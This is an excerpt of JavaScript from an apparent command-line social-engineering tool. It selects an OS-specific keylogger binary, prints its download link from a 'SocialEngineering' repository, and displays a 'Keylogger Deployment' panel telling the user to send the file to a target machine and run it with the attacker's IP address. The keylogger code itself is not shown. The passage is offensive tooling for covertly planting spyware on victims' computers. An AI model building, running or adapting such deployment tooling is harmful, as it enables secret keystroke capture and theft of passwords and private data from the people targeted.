...
function askQuestion(prompt) {
    if (_testQueue.length) {
        const ans = _testQueue.shift();
        process.stdout.write(prompt + ans + os.EOL);
...
async function run() {
    ...
    let suffix = osType === 'win' ? '_win.exe' : osType === 'linux' ? '_linux' : '_mac.dmg';
    const url = `https://github.com/Cappricio-Securities/SocialEngineering/blob/main/keylogger/build/keylogger${suffix}`;

    let runCmd = osType === 'win'
        ? './keylogger_win.exe <your IP>'
        : osType === 'linux'
        ? './keylogger_linux <your IP>'
        : './keylogger_mac.dmg <your IP>';
...
const urlLines = wrap(url, boxWidth - 4);

console.log('┏' + '━'.repeat(boxWidth) + '┓');
console.log(`┃ ${chalk.cyan('Keylogger Deployment').padEnd(boxWidth + 9)}┃`);
console.log('┣' + '━'.repeat(boxWidth) + '┫');

console.log(`┃ ${chalk.white('Download binary:').padEnd(boxWidth + 9)}┃`);

urlLines.forEach(line => {
    console.log(`┃ ${chalk.blue(line).padEnd(boxWidth + 9)}┃`);
});

console.log(`┃ ${' '.repeat(boxWidth - 1)}┃`);
console.log(`┃ ${chalk.white('Send this file to the target machine.').padEnd(boxWidth + 9)}┃`);
console.log(`┃ ${' '.repeat(boxWidth -1)}┃`);

const cmd = `${chalk.white('Run command:')} ${chalk.red(runCmd)}`;
console.log(`┃ ${cmd.padEnd(boxWidth + 19)}┃`);
